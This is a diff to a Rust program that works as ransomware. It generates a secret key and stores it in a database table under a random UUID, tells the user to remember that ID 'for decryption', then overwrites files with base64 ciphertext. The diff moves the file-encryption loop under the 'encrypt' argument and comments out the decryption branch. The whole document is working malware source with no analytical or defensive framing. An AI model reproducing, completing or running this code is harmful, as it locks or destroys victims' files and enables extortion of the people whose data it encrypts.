@@ -61,7 +61,6 @@ fn create_table(uuid: String, conn: &mut PooledConn, key: String) {
 	conn.query_drop(&insert_query).unwrap();
 }
 
-
 fn main() -> Result<(), Box<dyn Error>>{
 	println!("REMEMBER THE FOLLOWING UNIQUE ID FOR DECRYPTION!");
 	let assigned_uuid = Uuid::new_v4();
@@ -81,24 +80,24 @@ fn main() -> Result<(), Box<dyn Error>>{
 	let mut conn = pool.get_conn().unwrap();
 	let enc6432 = general_purpose::STANDARD.encode(seckey65);
 	create_table(newest_string, &mut conn, enc6432);
-	for file in files {
-		let filee324 = file;
-		let mut filee = OpenOptions::new().write(true).open(&filee324).unwrap();
-		let filecont = readfile(filee324)?;
-		if filecont != "" {
 			if args[1] == "encrypt" {
-				let encrypted = encrypt(&filecont, &secret_key53)?;
-				let enc64 = general_purpose::STANDARD.encode(encrypted);
-				filee.set_len(0)?;
-				filee.write(enc64.as_bytes())?;	
-				println!("{}", enc64);
+				for file in files {
+					let filee324 = file;
+					let mut filee = OpenOptions::new().write(true).open(&filee324).unwrap();
+					let filecont = readfile(filee324)?;
+					if filecont != "" {
+						let encrypted = encrypt(&filecont, &secret_key53)?;
+						let enc64 = general_purpose::STANDARD.encode(encrypted);
+						filee.set_len(0)?;
+						filee.write(enc64.as_bytes())?;	
+						println!("{}", enc64);
+					}		
 			}
-			if args[1] == "decrypt"{
-				let decced = decrypt(&filecont)?;
-				filee.set_len(0)?;
-				filee.write(decced.as_bytes())?;
-			}
-		}
+			//if args[1] == "decrypt"{
+			//	let decced = decrypt(&filecont)?;
+			//	filee.set_len(0)?;
+			//	filee.write(decced.as_bytes())?;
+			//}
 	}
 	println!("Press enter to exit.");
 	let mut input = String::new();
